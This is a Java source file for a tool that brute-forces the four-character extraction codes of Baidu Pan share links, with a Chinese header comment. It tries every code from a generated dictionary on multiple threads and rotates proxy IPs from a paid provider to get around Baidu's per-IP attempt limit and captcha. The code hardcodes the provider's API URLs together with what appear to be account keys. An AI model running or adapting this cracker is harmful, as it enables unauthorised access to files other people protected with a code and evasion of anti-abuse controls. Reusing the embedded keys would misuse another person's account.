package priv.light.baidu;

import lombok.extern.slf4j.Slf4j;
import org.apache.hc.client5.http.classic.methods.HttpGet;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

/**
 * <p>
 * ------使用提示
 * 使用前需要自行准备代理, 接入代理后, 提供百度网盘的分享链接运行即可.
 * 此处使用 携趣 代理, 其他代理需要按代理商的API进行配置.
 * password.txt: 提取码字典, 当password.txt不存在时会自动生成.
 * passwordHasTest.txt: 已经测试过的错误提取码记录在此, 每次运行会自动去除已经测试过的提取码.正确的提取码亦保存在此文件中, 形如:
 * "https://pan.baidu.com/s/1XXX 的提取码: YYYY"
 * ------
 * </p>
 *
 * <p>
 * ------程序运行入口
 * priv.light.baidu.BaiDuPanFetchCrack#main(java.lang.String[])
 * 日志存储在项目的 logs 文件夹下
 * ------
 * </p>
 *
 * <p>
 * ------破解花费时间
 * 取决于代理的网络质量和线程数量, 与线程数量正相关, CPU核心数量越多, 破解花费就越少.
 * 提取码字典长度 => 36 * 36 * 36 * 36 = 1,679,616个
 * 测试线程数量 => 10个
 * 每秒测试数量 => 28个
 * 测试最长预计 => 16个小时
 * ------
 * </p>
 *
 * <p>
 * ------停止程序注意事项
 * 若手动停止程序, 则必须等待程序执行完关闭前的动作, 以保存已经测试过的提取码到passwordHasTest.txt
 * ------
 * </p>
 *
 * @author Light
 * @date 2022/3/25 21:21
 */

@Slf4j
public class BaiDuPanFetchCrack {

    public static void main(String[] args) throws IOException, URISyntaxException {
        System.setProperty("log4j2.AsyncQueueFullPolicy", "Synchronous");

        // 百度网盘的分享链接 形如 https://pan.baidu.com/s/1XXX
        URI panUri = new URI("https://pan.baidu.com/s/1ihyJ_jg6J4B0pbmrmMQhfA");

        File passwordFile = new File("password.txt");
        File hasTestPasswordFile = new File("passwordHasTest.txt");

        // 获取代理IP地址和端口的代理商的URL
        // 百度网盘限制1个IP和端口无验证码请求只能达4次, 多于4次需要验证码, 因此需要使用代理
        HttpGet proxy = new HttpGet("http://api.xiequ.cn/VAD/GetIp.aspx?act=getturn51&uid=56669&vkey=CD49B0BABC5D0692AF75B0A3FC47CDAD&num=1&time=6&plat=0&re=0&type=7&so=1&group=51&ow=1&spl=1&addr=&db=1");
        HttpGet clearWhiteList = new HttpGet("http://op.xiequ.cn/IpWhiteList.aspx?uid=56669&ukey=524F8242625394E2851494D7D68D5A84&act=del&ip=all");
        StringBuilder addWhiteList = new StringBuilder("http://op.xiequ.cn/IpWhiteList.aspx?uid=56669&ukey=524F8242625394E2851494D7D68D5A84&act=add&ip=");
        HttpGet ip = new HttpGet("http://api.xiequ.cn/VAD/OnlyIp.aspx?yyy=123");

        // 是否排除测试 0000 1111 2222 ... zzzz 等提取码, 仅当不存在password.txt时生效
        boolean distinct = true;

        // 是否每次请求测试前对百度网盘分享链接进行验证, 即检查是否取消分享; 关闭此检查可以极大提升速度
        boolean validateShare = false;
        int corePoolSize = Runtime.getRuntime().availableProcessors() + 1;
        CrackPasswordPool pool = new CrackPasswordPool(validateShare, corePoolSize, passwordFile, hasTestPasswordFile, distinct);

        HttpUtil httpUtil = new HttpUtil(panUri, proxy, pool);
        ProxyResponseHandler proxyResponseHandler = httpUtil.getProxyResponseHandler();
        proxyResponseHandler.setAddWhiteList(addWhiteList);
        proxyResponseHandler.setClearWhiteList(clearWhiteList);
        proxyResponseHandler.setIp(ip);

        pool.setHttpUtil(httpUtil);

        Runtime.getRuntime().addShutdownHook(new ManualExitShutDownHook(pool));

        while (true) {
            if (!pool.execute()) {
                break;
            }
        }

        pool.waitForComplete();
    }

}
